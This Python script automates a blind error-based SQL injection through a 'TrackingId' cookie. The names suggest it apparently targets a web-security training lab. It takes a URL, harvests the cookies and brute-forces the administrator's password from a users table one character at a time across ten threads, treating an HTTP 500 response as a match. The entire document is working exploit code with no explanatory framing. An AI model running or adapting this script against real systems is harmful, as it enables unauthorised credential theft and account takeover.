import requests
from requests.exceptions import ConnectionError
from threading import Thread
from time import sleep

session = requests.session()

chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:'\",.<>/?"
password_length = 20

retrieved = {}
index = 1
char_index = 0
threads_num = 10
is_sleep_required = False
seconds = 5


def send_request(char):
    global retrieved
    global index
    global char_index
    global is_sleep_required
    global tracking_id
    global session_id

    print("[*] Trying: ", char)

    burp0_cookies = {
        "TrackingId": f"{tracking_id}'||(select case when '{char}'=substr(password,{index},1) then to_char(1/0) else '' end from users where username = 'administrator')||'",
        "session": session_id,
    }

    try:
        response = session.get(burp0_url, cookies=burp0_cookies)
    except ConnectionError:
        is_sleep_required = True
    else:
        is_sleep_required = False

        if response.status_code == 500:
            retrieved[index] = char
            index += 1
            char_index = 0
            print("[+] Found: ", char)


def send_multiple_request():
    global char_index
    global threads_num

    threads = []

    for i in range(char_index, min(char_index + threads_num, len(chars))):
        threads.append(Thread(target=send_request, args=(chars[i],)))

    char_index += threads_num

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


def get_cookie_values(url):
    response = requests.get(url)
    cookies = response.headers.get("Set-Cookie", None)

    if cookies:
        return cookies.split(";")


burp0_url = input("URL: ")
cookies = get_cookie_values(burp0_url)

tracking_id = list(filter(lambda x: "TrackingId=" in x, cookies))[0]
session_id = list(filter(lambda x: "session=" in x, cookies))[0]

while index <= password_length:
    send_multiple_request()

    # if is_sleep_required:
    #     print(f"[!] Hit the max retries, trying again after {seconds} seconds")
    #     sleep(seconds)
    #     char_index -= threads_num
    #     continue


print("Retrieved: ", "".join(retrieved.values()))
